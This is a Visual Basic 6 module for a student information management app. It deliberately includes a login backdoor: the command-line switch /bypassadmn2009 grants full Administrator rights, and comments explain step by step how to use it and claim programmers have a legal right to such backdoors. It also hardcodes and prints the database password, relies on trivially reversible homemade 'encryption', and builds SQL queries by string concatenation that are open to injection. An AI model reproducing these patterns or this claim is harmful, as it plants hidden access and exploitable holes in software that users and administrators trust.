Attribute VB_Name = "modMain"
'=========================================
'=  Developed by P. G. B. Prasanna       =
'=  A Software Developer from Sri Lanka  =
'=  E-Mail: pgbsoft@gmail.com            =
'=========================================


'Api Functions, Type Decalarations and Constants used in this program
'--------------------------------------------------------------------

Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, _
 ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, _
 ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
 
Public Declare Function InitCommonControlsEx Lib "comctl32.dll" (iccex As tagInitCommonControlsEx) As Boolean

Public Declare Function CreateRoundRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, _
 ByVal Y2 As Long, ByVal X3 As Long, ByVal Y3 As Long) As Long
 
Public Declare Function CreateEllipticRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, _
 ByVal Y2 As Long) As Long
 
Public Declare Function SetWindowRgn Lib "user32" (ByVal hwnd As Long, ByVal hRgn As Long, ByVal bRedraw As Boolean) As Long

Public Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, _
 lParam As Any) As Long

Public Declare Function ReleaseCapture Lib "user32" () As Long



'Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, _
' ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

Public Type tagInitCommonControlsEx
   lngSize As Long
   lngICC As Long
End Type

Public Const ICC_USEREX_CLASSES = &H200

Public Const SW_SHOW = 5

Public Const WM_NCLBUTTONDOWN = &HA1
Public Const HTCAPTION = 2

Public xp As Long, yp As Long
Public mShape As Integer
Public mChildFormRegion As Long



'Public Const HWND_NOTOPMOST = -2
'Public Const HWND_TOPMOST = -1
'Public Const SWP_NOMOVE = &H2
'Public Const SWP_NOSIZE = &H1


'Registry Location constants without encrypting
'----------------------------------------------

'Public Const PrevInstance = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Start\PrevInstance"
'Public Const Email_Client_Loc = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\EmailClient"
'Public Const Default_File_Loc = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\DefaultFileLocation"
'Public Const Default_Prompt = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\DefaultPrompt"
'Public Const File_Open_Set = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\FileOpen"
'Public Const Email_Seperator = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\Emseperator"
'Public Const Pword = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\pword\enabled"
'Public Const Database_Path_Store = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\dbpath"
'Public Const Loggeduser = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\lastuser"
'public const Is_First = "HKEY_CURRENT_USER\Software\StudentInfoBasics\Options\IsFirst"

'Encrypted Registry Location constants
'--------------------------------------
'Here we arrange the above constants in encrypted form so that the actual values are not stored in the source code.
'Later, they are decrypted and assign to varialbes, which we use in the program. By using this method the secret information of
'your complied program can not be easily recognized or altered using Hex/Text Editors. For more security you can directly
'call the decryption function with the relevant constant value at where you need the actual information, without using variables
'to hold them.

Public Const C_Key1 = "7B0B6A9ABA189A5AC97AE749AA4A4AD97A2A08C82A1969F9C8C689E859F" & _
                      "699298868694927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key2 = "9B9B2BCB8A9A4B098AEAAA683BAA2BD91AF9D749AA4A4AD97A2A08C82A1" & _
                      "969F9C8C689E859F699298868694927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key3 = "9B4B0B1B3B093BAA2BD91AF9D749AA4A4AD97A2A08C82A1969F9C8C689E85" & _
                      "9F699298868694927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key4 = "EA4AEAC81A7A3AF749AA4A4AD97A2A08C82A1969F9C8C689E859F699298868" & _
                      "694927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key5 = "5B1B5B1A1B3ADA1AEA7AE749AA4A4AD97A2A08C82A1969F9C8C689E859F6" & _
                      "99298868694927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key6 = "9A9AFA4A2AEA4AA91AEAAA1B9A49AA4A4AD97A2A08C82A1969F9C8C689E859F6992988" & _
                      "68694927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key7 = "6A1BD9BAC9D949AA4A4AD97A2A08C82A1969F9C8C689E859F6992988" & _
                      "68694927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key8 = "2B4A1B2B0BEAB95A49AA4A4AD97A2A08C82A1969F9C8C689E859F699298868694" & _
                      "927A728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
Public Const C_Key9 = "3B1BFA5A18DA2849AA4A4AD97A2A08C82A1969F9C8C689E859F699298868694927A" & _
                      "728E8C719D8E768961766855666F636C525E5D5F5C47606B405C4"
                      
'The encrypted database password
'-------------------------------

Public Const Db_Pwd_Encoded = "74D3C3D377A6B7E647E6F6" 'The database password is kingsam2009

'=================================================================================================================================
'=                                                                                                                               =
'= Backdoor                                                                                                                      =
'= --------                                                                                                                      =
'= A back door is an alternate and secret way of entering a computer system. As a programmer you have a legal right to include   =
'= a backdoor with your programme. It's a sole secret to the programmer and must be used for a positive purpose only.            =
'=                                                                                                                               =
'= There are many ways to include a backdoor with a program. Here I am using a simple way, a command line argument as the        =
'= backdoor.                                                                                                                     =
'=                                                                                                                               =
'=================================================================================================================================

'Encrypted command line switch used as the back door
'---------------------------------------------------

Private Const B_Door = "B4140414C7A707C6D7C79677F77633" 'The command line switch is /bypassadmn2009.

'For Database Connections
'------------------------

Public dbcon As ADODB.Connection
Public dbimport As ADODB.Connection

'Custom Variables
'----------------

Public Reg_Obj As Object
Public strMail_Client As String
Public strFile_Save As String
Public strEmail_Seperator As String
Public strFile_Open As String
Public Option_status, p_val As Integer
Public intbrowseoption As Integer
Public intproceed, intdbclear, intdbproceed As Integer
Public Located_Database, Database_Path As String
Public intSearch_delete As Integer
Public intaccount_type, user_read_privilege, user_write_privilege As Integer
Public User, ret_user As String
Public Email_Client_Loc, Default_File_Loc, Default_Prompt, File_Open_Set, Email_Seperator, _
 Pword, Database_Path_Store, Loggeduser, Is_First As String
Public intPaintFlag As Integer

 
Public Sub openDatabase()
'Original database password is kingsam2009
On Error GoTo db_Error
Database_Path = Read_Registry(Database_Path_Store)
Set dbcon = New ADODB.Connection
dbcon.ConnectionString = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Database_Path & _
                         ";Persist Security Info=False;Jet OLEDB:Database Password=" & _
                         Decrypt(Db_Pwd_Encoded)
dbcon.Open
intdbproceed = 1
If intdbproceed = 0 Then
    Exit Sub
ElseIf intdbproceed = 1 Then
    'Here we use the command line switch, /bypassadmn2009 as our backdoor.
    'If it succeeds you can log onto the system bypassing the general password prompt and you will have
    'full privileges of Administrator.(The command line switch is not case sensitive, which means,/bypassadmn2009
    '/Bypassadmn2009,/BYPASSADMN2009 all have the same result.
    
    'How to use the backdoor.
    '------------------------
     'First Method:
     '--------------
        'Assume that your executable file locates as C:\StdInfo.exe.
        'Create a Shortcut for the executable.
        'Then, you should modify the string in the Target field as "C:\StdInfo.exe" /bypassadmn2009
        'Make sure to put a space before /bypassadmn2009
        
     'Second Method:
     '--------------
        'Go to Locaton of the executable with command prompt(cmd.exe)
        'Then, type as StdInfo.exe /bypassadmn2009 (Make sure to put a space before /bypassadmn2009)
            
    If UCase(Command$) = UCase(Decrypt(B_Door)) Then
        User = "Administrator": user_read_privilege = 1
        user_write_privilege = 1: intaccount_type = 1
        frmSplash.Show
    Else
        frmLogin.Show
    End If
End If
Exit Sub
db_Error:
intdbproceed = 0
frmDatabaseSelectionMsg.Show
End Sub
Public Sub openImportDB()
'Original database password is kingsam2009
On Error GoTo db_Error
Database_PathIm = frmMain.txtImportDblocation
Set dbimport = New ADODB.Connection
dbimport.ConnectionString = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & Database_PathIm & _
                            ";Persist Security Info=False;Jet OLEDB:Database Password=" & _
                            Decrypt(Db_Pwd_Encoded)
dbimport.Open
intproceed = 1
Exit Sub
db_Error:
MsgBox "Selected database is not supported or database not found...", vbCritical
intproceed = 0
End Sub

Sub Main()
Dim iccex As tagInitCommonControlsEx
    With iccex
       .lngSize = LenB(iccex)
       .lngICC = ICC_USEREX_CLASSES
    End With
   InitCommonControlsEx iccex
   
Set Reg_Obj = CreateObject("Wscript.Shell")
'Check_Manifest_File
App.TaskVisible = False
If App.PrevInstance Then: End
'PrevInstance_Handle
Call Decrypt_Constants
Call openDatabase
End Sub

'Public Sub PrevInstance_Handle()
'On Error Resume Next
'    If Read_Registry(PrevInstance) = "True" Then
'        If App.PrevInstance Then
'        End
'        End If
'    ElseIf Read_Registry(PrevInstance) = "False" Then
'        Reg_Obj.RegWrite (PrevInstance), "True"
'        Exit Sub
'    End If
'End Sub
Public Sub Retrieve_Last_User()
On Error Resume Next
ret_user = Read_Registry(Loggeduser)
End Sub
Public Sub Mail_Me(ByVal My_Email_Address As String)
ShellExecute hwnd, "Open", "mailto:" & My_Email_Address, vbNullString, vbNullString, SW_SHOW
End Sub
'Checking the existence of a record
Public Function Check_for_Record_Existence(ByVal Tbl_Name As String, ByVal Tbl_Field As String, ByVal Find_Str As String, Optional opt As Integer = 0) As Boolean
Dim rstRecordExist As ADODB.Recordset
Set rstRecordExist = New ADODB.Recordset
Check_for_Record_Existence = False
rstRecordExist.Open "SELECT * FROM " & Tbl_Name & " WHERE " & "[" & Tbl_Field & "] = '" & Find_Str & "'", dbcon, adOpenStatic, adLockOptimistic
    If rstRecordExist.RecordCount > 0 Then
        Select Case opt
            Case 0: Check_for_Record_Existence = True: MsgBox "Record Already Exist...", vbExclamation
            Case 1: Check_for_Record_Existence = True
        End Select
    End If
rstRecordExist.Close: Set rstRecordExist = Nothing
End Function
'Encryption function used in this program.
Public Function Encrypt(ByVal StrPword) As String
On Error Resume Next
Dim i, ct As Integer
Dim letter, enc, strHexvalappend, strHexval As String
enc = ""
For i = 1 To Len(StrPword)
    letter = Mid(StrPword, i, 1)
    enc = enc & Chr(Asc(letter) + i + 3)
Next

For ct = 1 To Len(enc)
    strHexvalappend = Hex(Asc(Mid(enc, ct, 1)))
    strHexval = strHexval & strHexvalappend
Next
Encrypt = StrReverse(strHexval)
End Function
'Decryption function used in this program.
Public Function Decrypt(ByVal strDecoded_Pword As String) As String
On Error Resume Next
Dim i, ct As Integer
Dim letter, dec, StrValappend, strVal As String
dec = ""
strDecoded_Pword = StrReverse(strDecoded_Pword)

For ct = 1 To Len(strDecoded_Pword) Step 2
    StrValappend = Chr(Val("&H" & (Mid(strDecoded_Pword, ct, 2))))
    strVal = strVal & StrValappend
Next
strDecoded_Pword = strVal

For i = 1 To Len(strDecoded_Pword)
    letter = Mid(strDecoded_Pword, i, 1)
    dec = dec & Chr(Asc(letter) - i - 3)
Next
Decrypt = dec
End Function
Public Sub Decrypt_Constants()
'Here we decrypt the encrypted constants and assign them to variables so that the actual data is stored in memory.
On Error Resume Next
Email_Client_Loc = Decrypt(C_Key1): Default_File_Loc = Decrypt(C_Key2)
Default_Prompt = Decrypt(C_Key3): File_Open_Set = Decrypt(C_Key4)
Email_Seperator = Decrypt(C_Key5): Pword = Decrypt(C_Key6)
Database_Path_Store = Decrypt(C_Key7): Loggeduser = Decrypt(C_Key8)
Is_First = Decrypt(C_Key9)
End Sub
'This sub is used to round a form
Public Sub Set_Round(s_control As Form)
    mShape = 1
    xp = Screen.TwipsPerPixelX
    yp = Screen.TwipsPerPixelY
      
    If mShape = 1 Then
        mChildFormRegion = CreateRoundRectRgn(0, 0, s_control.Width / xp, s_control.Height / yp, 9, 9)
    Else
        mChildFormRegion = CreateEllipticRgn(0, 0, s_control.Width / xp, s_control.Height / yp)
    End If
    
    SetWindowRgn s_control.hwnd, mChildFormRegion, False
End Sub
'This sub is used to move a form without using the title bar.
Public Sub Getmove(p_control As Form)
 Dim lngreturnvalue As Long
      Call ReleaseCapture
      lngreturnvalue = SendMessage(p_control.hwnd, WM_NCLBUTTONDOWN, HTCAPTION, 0&)
 End Sub

'This function is used to read registry.
Public Function Read_Registry(ByVal Reg_Loc As String) As String
On Error Resume Next
Read_Registry = Reg_Obj.RegRead(Reg_Loc)
End Function
'This sub is used to write registry.
Public Sub Write_Registry(ByVal Reg_Loc As String, ByVal R_Val As Variant, Optional D_Type As Integer = 0)
On Error Resume Next
Select Case D_Type
    Case 0: Reg_Obj.RegWrite Reg_Loc, R_Val
    Case 1: Reg_Obj.RegWrite Reg_Loc, R_Val, "REG_DWORD"
End Select
End Sub
'Loads the pictures stored in resource
Public Sub Load_Resource_Picture_Enable(ByVal opt As Boolean)
With frmMain
    Select Case opt
        Case 1: .Image12.Picture = LoadResPicture(101, 0): .Image17.Picture = LoadResPicture(102, 0)
                .Image13.Picture = LoadResPicture(103, 0): .Image16.Picture = LoadResPicture(104, 0)
                .Image18.Picture = LoadResPicture(105, 0): .Image9.Picture = LoadResPicture(106, 0)
                .Image5.Picture = LoadResPicture(107, 0): .Image10.Picture = LoadResPicture(108, 0)
        Case 0: .Image12.Picture = LoadResPicture(109, 0): .Image17.Picture = LoadResPicture(110, 0)
                .Image13.Picture = LoadResPicture(111, 0): .Image16.Picture = LoadResPicture(112, 0)
                .Image18.Picture = LoadResPicture(113, 0): .Image9.Picture = LoadResPicture(114, 0)
                .Image5.Picture = LoadResPicture(115, 0): .Image10.Picture = LoadResPicture(116, 0)
    End Select
End With
End Sub
'Disable/Enable controls with long processes
Public Sub Control_Enable_With_Progress(ByVal ED_C As Boolean)
Dim i As Integer
Load_Resource_Picture_Enable ED_C
    With frmMain
        .Image12.Enabled = ED_C: .Image17.Enabled = ED_C: .Image13.Enabled = ED_C
        .Image16.Enabled = ED_C: .Image18.Enabled = ED_C: .Image9.Enabled = ED_C:
        .Image5.Enabled = ED_C: .Image10.Enabled = ED_C: .lblViewExport.Enabled = ED_C
        .lblGetEmails.Enabled = ED_C: .lblGetContacts.Enabled = ED_C: .lblStudentInfo.Enabled = ED_C
        .lblCourseInfo.Enabled = ED_C: .lblOptions.Enabled = ED_C: .lblLogOff.Enabled = ED_C
        .lblExit.Enabled = ED_C: .cmbSelectCourseContact.Enabled = ED_C: .lvwName_Contact.Enabled = ED_C
        .cmdSaveName.Enabled = ED_C: .cmdSaveNameContact.Enabled = ED_C: .chkAllContact.Enabled = ED_C
        .cmbClearDatabase.Enabled = ED_C: .cmdClear.Enabled = ED_C: .cmdFormatDatabase.Enabled = ED_C
        .cmdSelectDatabase.Enabled = ED_C: .cmdImportData.Enabled = ED_C:
        .Label48.Enabled = ED_C: .cmbSelectCourseExport.Enabled = ED_C: .cmbSearchCriteria.Enabled = ED_C
        .txtSearchDataView.Enabled = ED_C: .cmdCancelSearchDV.Enabled = ED_C: .lvwData.Enabled = ED_C
        .chkSelectAllItems.Enabled = ED_C: .cmdFormatDatabaseDV.Enabled = ED_C:
        .cmdIncluedAll.Enabled = ED_C: .cmdExport.Enabled = ED_C
        For i = 1 To .chkExportField.UBound: .chkExportField(i).Enabled = ED_C: Next
    End With
End Sub
